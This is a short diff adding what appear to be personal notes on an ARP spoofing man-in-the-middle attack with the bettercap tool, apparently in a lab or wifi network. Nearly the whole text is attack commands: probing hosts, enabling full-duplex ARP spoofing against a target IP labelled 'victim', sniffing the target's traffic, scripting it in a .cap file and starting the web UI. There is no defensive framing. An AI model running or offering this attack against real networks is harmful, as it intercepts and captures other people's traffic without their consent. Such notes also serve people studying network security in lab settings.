@@ -1,0 +1,18 @@
+-arp attack on virtual network (also work on wifi network-
+~# bettercap -iface eth0
+>>net.probe on
+>>net.show
+become MITM (man in the midle)
+» set arp.spoof.fullduplex true
+» set arp.spoof.targets 192.168.159.129(IP target/victim)
+» arp.spoof on
+start capturing the target data
+>> net.sniff on
+
+also we can use .cap file to automatically run our custom spoofing script, creat .cap file with notepad, then save on root directory
+
+-run bettercap ui-
+~# bettercap -iface eth0 
+» http-ui
+open web-ui
+» [16:28:55] [sys.log] [inf] http.server starting on http://127.0.0.1:80
